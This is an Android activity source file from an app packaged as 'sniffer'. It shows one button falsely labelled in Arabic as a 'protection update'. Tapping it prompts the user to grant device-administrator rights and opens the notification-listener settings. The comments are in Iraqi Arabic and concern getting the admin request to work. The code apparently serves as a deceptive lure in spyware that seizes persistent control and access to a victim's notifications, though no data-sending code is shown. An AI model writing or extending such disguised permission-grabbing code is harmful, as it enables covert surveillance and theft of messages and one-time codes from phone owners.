package com.v8.global.sniffer;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF000000);

        Button btn = new Button(this);
        btn.setText("تفعيل تحديث الحماية");
        btn.setBackgroundColor(0xFF0088FF);
        btn.setTextColor(0xFFFFFFFF);
        
        btn.setOnClickListener(v -> {
            // طلب صلاحية الأدمن (هسة راح يشتغل لأن صلحنا ملف الأدمن)
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(this, AdminReceiver.class));
            startActivity(adminIntent);

            // طلب صلاحية الإشعارات
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        });

        layout.addView(btn);
        setContentView(layout);
    }
}
